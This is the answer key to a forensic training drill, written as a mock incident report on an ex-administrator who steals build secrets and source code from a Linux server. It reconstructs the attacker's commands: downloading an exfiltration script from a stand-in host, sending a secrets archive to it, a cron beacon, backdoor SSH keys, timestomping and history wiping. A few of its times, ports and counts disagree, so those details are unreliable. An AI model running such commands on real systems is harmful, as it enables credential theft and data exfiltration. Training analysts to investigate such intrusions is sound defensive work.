# Solution: Drill 02 (Advanced) — Forensic Investigation

## Complete Forensic Report: CF-2024-0042

**Case Number:** CF-2024-0042

**Examiner:** ClearPath Forensics

**Report Date:** 2024-01-15

**Subject:** Michael Kumar (mkumar), former Senior System Administrator

**Organization:** Atlas Manufacturing

**System:** SRV-BUILD-02 (Ubuntu 22.04.3 LTS, IP: 10.10.0.5)

---

## Answer Key

### Task 1: Evidence Integrity and Initial Triage

**Q1: Hash verification:**

```console
sha256sum /forensics/evidence/*.json /forensics/evidence/*.log
```

All hashes match the values in `/forensics/evidence/hashes.txt`.
No tampering detected.

**Q2: Collection date and incident delta:**

* Collection: 2024-01-04T08:25:00Z
* Incident: 2024-01-04T02:14:22Z — 02:25:01Z
* Delta: ~6 hours between incident end and evidence collection

This 6-hour gap is significant — it means volatile data (live memory, network connections) may have partially degraded.
However, the memory snapshot was taken during collection and shows residual artifacts.

**Q3: 10 most recently modified files in mkumar's home:**

From timeline (sorted by timestamp, descending):

```text
2024-01-04T02:24:48Z  TRUNCATE  /home/mkumar/.bash_history  (0 bytes — cleared)
2024-01-04T02:24:35Z  DELETE    /home/mkumar/build_artifacts_export.tar.gz (shredded)
2024-01-04T02:18:45Z  CREATE    /home/mkumar/build_artifacts_export.tar.gz (2.1 GB)
2024-01-04T02:14:35Z  OPEN      /home/mkumar/.ssh/authorized_keys
```

**Q4: Timestomped files:**

`/root/.ssh/authorized_keys` has:

* `mtime` (recorded modification time): 2023-11-01 — appears to predate the incident
* `ctime` (inode change time): 2024-01-04T02:14:20Z — reveals actual modification during the unauthorized session

**This is timestomping** (T1070.006).
The attacker used `touch -t` or similar to backdate the mtime, attempting to make the backdoor SSH key appear pre-existing.
The `ctime` cannot be manipulated by normal user-space tools and reveals the truth.

```console
# Evidence command:
python3 /forensics/scripts/timeline.py --path "/root/.ssh"
```

---

### Task 2: Unauthorized Access

**Q1: Source IP and notable characteristics:**

From auth.log:

```text
Accepted publickey for mkumar from 198.51.100.77 port 52201
```

`198.51.100.77` is in the **IANA documentation range** (198.51.100.0/24 — RFC 5737), which in real scenarios would be replaced with an actual IP.
In the context of this drill, the IP is registered to a **VPN provider**, consistent with the alert description.
This means:

* Attacker used a VPN to obscure their true location
* The VPN provider may have logs, but requires legal process to obtain
* Cannot directly attribute the IP to mkumar's physical location

**Q2: Authentication method:**

From auth.log: `Accepted publickey` — SSH public key authentication.

From `authorized_keys_mkumar`:

```text
ssh-rsa AAAAB3... mkumar@atlas-workstation   ← original key (should have been removed at offboarding)
ssh-rsa AAAAB3... mkumar-backdoor@atlas      ← NEW backdoor key
```

**Answer:** mkumar's original SSH key was **never revoked** from the server after his resignation — a critical offboarding failure.
He also added a second backdoor key during the session.
Both keys were still in `authorized_keys` at collection time.

**Q3: Was mkumar's account still active?**

Evidence from `/etc/passwd` state at collection shows mkumar's account (`uid=1001`) was present but should have been locked.
The SSH key was still in `authorized_keys`, allowing key-based authentication even if the password was locked — SSH public key auth bypasses PAM password locking.

**Q4: Backdoor persistence:**

Three persistence mechanisms found:

1. **Backdoor SSH key in mkumar's authorized_keys**: `mkumar-backdoor@atlas` key — allows re-entry via SSH
1. **Backdoor SSH key in root's authorized_keys** (TIMESTOMPED): `mkumar-backdoor@atlas` key also added to `/root/.ssh/authorized_keys` — provides direct root access
1. **Cron job**: `/var/spool/cron/crontabs/mkumar` — `*/30 * * * * curl -s http://198.51.100.77/beacon?h=$(hostname)` — beacons out to C2 every 30 minutes

---

### Task 3: Activity Reconstruction

**Q1: Commands run during unauthorized session:**

Reconstructed from auditd `EXECVE` records (bash history was cleared):

```bash
id
ls /opt/build /var/repo
ls -la /opt/build/
cat /opt/build/.env              # Read CI/CD secrets
cat /opt/build/deploy_rsa        # Read production deployment key
find /opt/build -name "*.key" -o -name "*secret*" -o -name "*.pem"
wget -q http://198.51.100.77/tools/exfil.sh -O /tmp/.x
chmod +x /tmp/.x
tar czf /home/mkumar/build_artifacts_export.tar.gz /opt/build /var/repo/atlas-core /etc/deploy_keys
/tmp/.x /home/mkumar/build_artifacts_export.tar.gz 198.51.100.77 8443
cp /home/mkumar/build_artifacts_export.tar.gz /media/usb0/
shred -u /home/mkumar/build_artifacts_export.tar.gz
rm /tmp/.x
history -c   # Clear history
```

**Q2: Directories/repositories accessed:**

* `/opt/build/` — CI/CD build environment (source code, secrets, API keys, deployment keys)
* `/opt/build/.env` — environment variables file (likely contains API keys, database credentials)
* `/opt/build/deploy_rsa` — production deployment SSH private key
* `/var/repo/atlas-core/` — core product Git repository (~1.8 GB)
* `/etc/deploy_keys/` — deployment SSH keys directory

**Q3: Data staging evidence:**

The `tar` command staged all accessed directories into a single archive:

```text
tar czf /home/mkumar/build_artifacts_export.tar.gz /opt/build /var/repo/atlas-core /etc/deploy_keys
```

This is classic **data staging** (T1074.001) — collecting data from multiple sources into one archive before exfiltration.

**Q4: Tools downloaded:**

`/tmp/.x` was downloaded from `http://198.51.100.77/tools/exfil.sh` — a custom exfiltration script.
It was executed once, then deleted (`rm /tmp/.x`).
The binary was 2 KB, consistent with a small shell or Python script that opened a TCP connection to port 8443 and streamed the archive.
The contents are not recoverable (no shred, but blocks may be overwritten), but the memory snapshot shows a residual `curl`/`python3` process connecting to 198.51.100.77:4443.

---

### Task 4: Data Exfiltration Analysis

**Q1: Contents of `build_artifacts_export.tar.gz`:**

From deleted file metadata and `tar` command arguments:

```text
opt/build/           — CI/CD pipeline, source code, scripts, .env (API keys), deploy_rsa (SSH key)
var/repo/atlas-core/ — Core product source code repository (~1.8 GB)
etc/deploy_keys/     — All deployment SSH private keys (prod + staging)
```

**Total archive size: 2,254,857,830 bytes (2.1 GB)**

**Q2: Created and deleted:**

* Created: `2024-01-04T02:18:45Z` (immediately after `tar` completed, ~2.5 min to create)
* Deleted: `2024-01-04T02:24:35Z` (via `shred -u` — secure overwrite + unlink)

**Q3: Was data copied to USB or exfiltrated over network?**

**Both.** The sequence was:

1. Network exfiltration: `2024-01-04T02:19:05Z` — 2.1 GB sent to `198.51.100.77:8443` via the exfil tool (`/tmp/.x`)
1. USB copy: `2024-01-04T02:23:20Z` — `cp` command copied the archive to `/media/usb0/` (SanDisk USB)

The attacker used dual exfiltration as a redundancy strategy.

**Q4: Estimated size of data exfiltrated:**

* Network: **2.1 GB** (confirmed by netflow: `bytes_out: 2,254,857,830`)
* USB: **2.1 GB** (same archive)

Total unique data: **2.1 GB** (same archive both methods)

**Q5: Destination identification:**

| Method | Destination | Identifier |
|--------|------------|------------|
| Network | `198.51.100.77:8443` (VPN exit node) | IP address, TCP flow |
| USB | SanDisk USB 3.0, 30.7 GB capacity | Serial: `20240103AA4F2B9C` |

The USB serial number enables physical device tracking if found.
The IP is a VPN exit node — legal process required for subscriber records.

---

### Task 5: Memory Forensics

**Q1: Unexpected processes:**

From memory snapshot:

* **PID 1201** (`curl` — cron beacon): `curl -s http://198.51.100.77/beacon?h=srv-build-02` — unexpected on a build server; indicates a live C2 beacon cron job
* **PID 9050** (`/tmp/.deleted_tool`): Running from a **deleted binary** — the executable was deleted from disk but the process is still in memory. This is anti-forensic behavior.

**Q2: Network connections to unusual destinations:**

* PID 1201: `10.10.0.5:60001 → 198.51.100.77:80` (TIME_WAIT — recent beacon to C2)
* PID 9050: `10.10.0.5:60100 → 198.51.100.77:4444` (CLOSE_WAIT — residual reverse shell)

Port 4444 is the classic Metasploit/Netcat reverse shell port.
The connection was closing but visible in memory, indicating a reverse shell had been active.

**Q3: Files open in memory that were deleted from disk:**

* PID 9001: `/home/mkumar/.bash_history` open with size 0 — confirms history was actively truncated, not just emptied
* PID 9050: The deleted tool's stdout descriptor still open

**Q4: Anti-forensic activity in memory:**

1. **`history -c`** was executed (visible in auditd EXECVE) and confirmed by the bash_history file being 0 bytes while its fd is still open by PID 9001
1. **Deleted binary** (PID 9050) — tool deleted from disk while still running; prevents binary analysis
1. **`shred -u`** on the archive — secure deletion overwrites data before unlinking
1. **Timestomping** of `/root/.ssh/authorized_keys` — altering mtime to hide modification

**Forensic recovery opportunities:**

* The deleted binary (PID 9050) can be recovered from `/proc/9050/exe` → link to deleted file: `cp /proc/9050/exe /tmp/recovered_tool`
* Memory contents of all processes may yield strings, keys, and partial file data via memory forensics tools (Volatility `linux.malfind`, `linux.memmap`)

---

### Task 6: Forensic Report

## FORENSIC INVESTIGATION REPORT — CF-2024-0042

### 1. Case Summary

On 2024-01-04 at approximately 02:14 UTC, unauthorized SSH access was made to `SRV-BUILD-02` using credentials belonging to Michael Kumar (mkumar), a former Senior System Administrator whose employment was terminated.
During a ~10-minute session, Kumar accessed CI/CD secrets, source code repositories, and deployment SSH keys, staged approximately 2.1 GB of data, exfiltrated it via both a network connection and a USB device, attempted to destroy evidence, and installed persistence mechanisms.
This report presents findings to support potential disciplinary and legal action.

### 2. Evidence Inventory

All SHA256 hashes verified at analysis hand-off.
No evidence of tampering detected (exception: `.bash_history` is legitimately truncated — this is itself evidence of anti-forensic activity, not evidence corruption).

### 3. Timeline of Events (Condensed)

| Time (UTC) | Event |
|------------|-------|
| 2024-01-04T02:14:20Z | Root SSH authorized_keys modified (TIMESTOMPED — actual time) |
| 2024-01-04T02:14:22Z | SSH login from 198.51.100.77 as `mkumar` via public key |
| 2024-01-04T02:15:01–47Z | Enumerated build dirs; read CI/CD `.env` and `deploy_rsa` key |
| 2024-01-04T02:16:10Z | Downloaded exfiltration tool `exfil.sh` from C2 server |
| 2024-01-04T02:16:30Z | Created 2.1 GB archive of source code, secrets, and keys |
| 2024-01-04T02:19:05Z | Exfiltrated archive over network to 198.51.100.77:8443 |
| 2024-01-04T02:23:10Z | USB device mounted; archive copied |
| 2024-01-04T02:24:30–48Z | Anti-forensics: shred archive, delete tool, clear history |
| 2024-01-04T02:25:01Z | SSH session ends |
| 2024-01-04T02:25:05Z | Cron beacon installed (persists after session) |

### 4. Findings

**4.1 Unauthorized Access:** mkumar's SSH key was never removed at offboarding.
He also added a personal backdoor key.
Root authorized_keys were also backdoored (TIMESTOMPED).

**4.2 Data Accessed:** CI/CD pipeline secrets (`.env`), production deployment private key (`deploy_rsa`), core product repository (`atlas-core`, ~1.8 GB), all deployment keys (`/etc/deploy_keys/`).

**4.3 Data Exfiltration:** 2.1 GB via network (198.51.100.77:8443) AND USB (SanDisk serial 20240103AA4F2B9C).
Dual exfiltration confirms deliberate intent.

**4.4 Anti-Forensics:** `shred -u` on archive, `rm` on tool, `history -c`, timestomping of `/root/.ssh/authorized_keys`.

### 5. Backdoors Remaining at Collection Time

1. mkumar SSH key still in `/home/mkumar/.ssh/authorized_keys`
1. Backdoor key in `/root/.ssh/authorized_keys` (timestomped)
1. Cron beacon: `*/30 * * * * curl http://198.51.100.77/beacon?h=$(hostname)`
1. Residual process PID 9050 running deleted binary with connection to 198.51.100.77:4444

### 6. Attribution

**Confidence Level: High**

Evidence supporting attribution to Michael Kumar:

1. SSH login used a key associated with his account (`mkumar-backdoor@atlas` comment)
1. The session accessed directories and files matching his prior privileged access
1. The original account's key was never rotated — only a former holder would have the private key
1. The `known_hosts` file shows prior knowledge of the attacker C2 IP (198.51.100.77) and internal systems
1. Activity pattern consistent with an insider with existing knowledge (no enumeration of unknown paths)
1. The USB device was used during a session lasting only 10 minutes — attacker knew exactly what to take

**Caveats:** The VPN IP prevents direct geographic attribution.
A compromised workstation (if mkumar's laptop was stolen) could theoretically be an alternative explanation — low probability given the specific knowledge demonstrated.

### 7. Recommendations

**Immediate (within 24 hours):**

1. Remove all SSH keys associated with mkumar from all systems
1. Revoke all deployment keys in `/etc/deploy_keys/` — they are compromised
1. Rotate all secrets in `/opt/build/.env` (API keys, passwords, tokens)
1. Kill cron beacon (remove `/var/spool/cron/crontabs/mkumar`; block 198.51.100.77)
1. Kill PID 9050; recover binary from `/proc/9050/exe` for analysis

**Short-term (within 1 week):**

1. Audit all systems mkumar had access to for similar backdoors
1. Re-generate all deployment SSH keys and CI/CD secrets
1. Implement offboarding checklist that explicitly includes SSH key revocation from all servers
1. Notify affected downstream systems (prod/staging) that deployment keys may be compromised

**Long-term:**

1. Implement **Just-In-Time (JIT) access** for privileged accounts — no standing SSH access
1. Use **certificate-based SSH authentication** with short TTLs (hours, not indefinitely-valid keys)
1. Deploy centralized SSH key management (HashiCorp Vault SSH Secrets Engine, Teleport, etc.)
1. Implement **data loss prevention (DLP)** monitoring for large file creation and archive commands
1. Add auditd rules to alert on `tar czf`, `scp`, `rsync`, and large outbound network transfers

---

## MITRE ATT&CK Mapping

| ID | Technique | Observed |
|----|-----------|---------|
| T1078.001 | Valid Accounts: Default Accounts | mkumar's key never revoked — valid credential reuse |
| T1021.004 | Remote Services: SSH | Unauthorized SSH session |
| T1074.001 | Data Staged: Local Data Staging | `tar czf` creating 2.1 GB archive |
| T1048.003 | Exfiltration Over Alternative Protocol: Non-C2 | Network exfil to 198.51.100.77:8443 |
| T1052.001 | Exfiltration Over Physical Medium: USB | Copy to SanDisk USB device |
| T1098.004 | Account Manipulation: SSH Authorized Keys | Backdoor keys added |
| T1053.003 | Scheduled Task/Job: Cron | Beacon cron job installed |
| T1070.003 | Indicator Removal: Clear Command History | `history -c` + bash_history truncated |
| T1070.006 | Indicator Removal: Timestomp | `/root/.ssh/authorized_keys` mtime backdated |
| T1070.004 | Indicator Removal: File Deletion | `shred -u` on archive; `rm` on tool |
| T1552.004 | Unsecured Credentials: Private Keys | `deploy_rsa` and `/etc/deploy_keys` accessed |
| T1552.001 | Unsecured Credentials: Credentials in Files | `/opt/build/.env` read |
